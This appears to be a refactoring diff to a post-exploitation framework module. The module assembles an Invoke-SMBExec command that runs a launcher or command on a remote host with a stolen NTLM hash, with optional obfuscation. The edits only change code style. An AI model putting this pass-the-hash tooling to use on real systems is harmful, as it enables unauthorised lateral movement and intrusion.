@@ -51,7 +51,7 @@ class Module:
             # not a valid listener, return nothing for the script
             return handle_error_message("[!] Invalid listener: " + listener_name)
 
-        elif listener_name:
+        if listener_name:
             # generate the PowerShell one-liner with all of the proper options set
             launcher = main_menu.stagers.generate_launcher(
                 listenerName=listener_name,
@@ -76,9 +76,7 @@ class Module:
         else:
             Cmd = "%COMSPEC% /C start /b " + command
 
-        script_end = "Invoke-SMBExec -Target {} -Username {} -Domain {} -Hash {} -Command '{}'".format(
-            computer_name, user_name, domain, ntlm_hash, Cmd
-        )
+        script_end = f"Invoke-SMBExec -Target {computer_name} -Username {user_name} -Domain {domain} -Hash {ntlm_hash} -Command '{Cmd}'"
         outputf = params.get("OutputFunction", "Out-String")
         script_end += (
             f" | {outputf} | "
@@ -87,10 +85,9 @@ class Module:
             + ' completed!"'
         )
 
-        script = main_menu.modulesv2.finalize_module(
+        return main_menu.modulesv2.finalize_module(
             script=script,
             script_end=script_end,
             obfuscate=obfuscate,
             obfuscation_command=obfuscation_command,
         )
-        return script
